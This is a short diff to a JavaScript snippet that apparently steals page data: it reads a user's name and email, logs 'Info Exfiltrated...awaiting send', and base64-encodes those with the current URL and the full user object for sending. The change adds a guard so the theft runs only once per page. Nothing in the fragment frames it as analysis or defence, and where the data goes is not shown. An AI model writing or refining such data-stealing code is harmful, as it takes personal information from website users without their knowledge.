@@ -10,6 +10,8 @@
         const n = d.user?.name || 'N/A';
         const e = d.user?.email || 'N/A';
         console.log('Info Exfiltrated...awaiting send')
+        if (window.ran) return; // prevent running twice
+        window.ran = 1;
         console.log('Passed Checks! Sending Info...')
         const b = btoa(
           JSON.stringify({ name: n, email: e, src: currentUrl, data: d })
